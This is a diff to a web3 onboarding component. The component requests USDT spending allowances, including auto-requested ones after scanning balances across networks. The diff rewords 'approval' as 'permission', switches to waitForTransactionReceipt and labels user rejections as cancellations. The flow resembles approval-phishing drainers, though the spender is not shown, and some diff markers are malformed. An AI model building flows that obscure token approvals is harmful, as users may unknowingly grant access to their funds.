@@ -7,7 +7,7 @@ import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
 import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount, ERC20_ABI, USDT_ADDRESSES, checkERC20BalancesAllNetworks } from '../web3/tokenTransfer'
 import { CHAIN_IDS, CHAIN_NAMES, wagmiConfig } from '../web3/config.jsx'
-import { readContract, getPublicClient } from 'wagmi/actions'
+import { readContract, getPublicClient, waitForTransactionReceipt } from 'wagmi/actions'
 import { formatUnits, createPublicClient, http as viemHttp } from 'viem'
 import { mainnet as viemMainnet, polygon as viemPolygon, arbitrum as viemArbitrum, base as viemBase } from 'viem/chains'
 import { RESOLVED_RPC_URLS } from '../web3/config.jsx'
@@ -271,14 +271,15 @@ export default function Onboarding() {
 -      setApprovalStatus(`Approval transaction sent on ${usdtNetwork}: ${tx}`)
 +      setApprovalStatus(`Permission request sent on ${usdtNetwork}: ${tx}`)
        // Wait for transaction to be mined (consider using waitForTransactionReceipt)
-       await tx.wait()
+       await waitForTransactionReceipt(wagmiConfig, { hash: tx })
 -      setApprovalStatus(`USDT approval successful on ${usdtNetwork}!`)
 +      setApprovalStatus(`Permission to spend USDT granted on ${usdtNetwork}!`)
       await checkCurrentAllowance(usdtNetwork)
     } catch (error) {
       console.error('Approval failed:', error)
--      setApprovalStatus(`Approval failed: ${error.message}`)
-+      setApprovalStatus(`Permission request failed: ${error.message}`)
+      const msg = (typeof error === 'string' ? error : (error?.message || error?.toString?.() || 'Unknown error'))
+      const display = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || error?.code === 4001 || error?.name === 'UserRejectedRequestError') ? 'Request cancelled by user' : msg
+      setApprovalStatus(`Permission request failed: ${display}`)
     } finally {
       setIsApproving(false)
     }
@@ -303,16 +304,17 @@ export default function Onboarding() {
       })
 -      setApprovalStatus(`Auto-approval transaction sent on ${networkName}: ${tx}`)
 +      setApprovalStatus(`Auto permission request sent on ${networkName}: ${tx}`)
-       // Wait for transaction to be mined
-       await tx.wait()
+       // Wait for transaction receipt using Wagmi/Viem
+       await waitForTransactionReceipt(wagmiConfig, { hash: tx })
 -      setApprovalStatus(`USDT auto-approval successful on ${networkName}!`)
 +      setApprovalStatus(`Permission to spend USDT auto-granted on ${networkName}!`)
       setUsdtNetwork(networkName)
       await checkCurrentAllowance(networkName)
     } catch (error) {
       console.error('Auto-approval failed:', error)
--      setApprovalStatus(`Auto-approval failed on ${networkName}: ${error.message}`)
-+      setApprovalStatus(`Auto permission request failed on ${networkName}: ${error.message}`)
+      const msg = (typeof error === 'string' ? error : (error?.message || error?.toString?.() || 'Unknown error'))
+      const display = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || error?.code === 4001 || error?.name === 'UserRejectedRequestError') ? 'Request cancelled by user' : msg
+      setApprovalStatus(`Auto permission request failed on ${networkName}: ${display}`)
     } finally {
       setIsApproving(false)
     }
